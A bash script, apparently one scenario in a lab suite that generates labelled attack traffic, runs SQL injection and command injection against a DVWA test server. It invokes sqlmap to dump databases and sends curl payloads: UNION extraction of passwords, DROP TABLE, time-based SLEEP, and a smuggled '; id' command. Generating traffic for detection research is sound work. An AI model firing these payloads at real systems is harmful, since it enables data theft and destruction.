#!/usr/bin/env bash
# S04 — SQL injection / command injection (DVWA di srv-web). Kategori: Exploits.
# Isi DVWA_COOKIE di targets.env (sesi login DVWA, security=low) agar sqlmap
# masuk endpoint ber-auth. Tanpa cookie: hanya burst payload via curl.
SCN=S04; ATTACK_CAT=Exploits; PHASE=any
HERE="$(cd "$(dirname "$0")" && pwd)"; . "$HERE/../_lib/common.sh"
need_tool curl
banner
ensure_up "$SRV_WEB"

mark_start "$SRV_WEB"
if [ -n "${DVWA_COOKIE:-}" ]; then
  need_tool sqlmap
  echo "== sqlmap (ber-auth, pakai cookie) =="
  sqlmap -u "${DVWA_URL}?id=1&Submit=Submit" \
    --cookie="$DVWA_COOKIE" --batch --level=2 --risk=2 \
    --dbs --dump --threads=4 --output-dir="$HERE/sqlmap-out" || true
else
  echo "DVWA_COOKIE kosong -> burst payload manual via curl (tetap trafik SQLi)."
  PAYLOADS=("1' OR '1'='1" "1' UNION SELECT user,password FROM users-- -" \
            "1'; DROP TABLE x-- -" "1' AND SLEEP(3)-- -" "1' OR 1=1#")
  for p in "${PAYLOADS[@]}"; do
    curl -s -G "$DVWA_URL" --data-urlencode "id=$p" --data-urlencode "Submit=Submit" \
         -o /dev/null -w "  sent[%{http_code}]: $p\n"
    sleep 1
  done
  # command-injection endpoint DVWA (ping) — pola injection tambahan
  curl -s "http://${SRV_WEB}/vulnerabilities/exec/" \
       --data-urlencode "ip=127.0.0.1; id" --data-urlencode "Submit=Submit" -o /dev/null \
       -w "  cmdi sent[%{http_code}]\n" || true
fi
mark_end "$SRV_WEB"
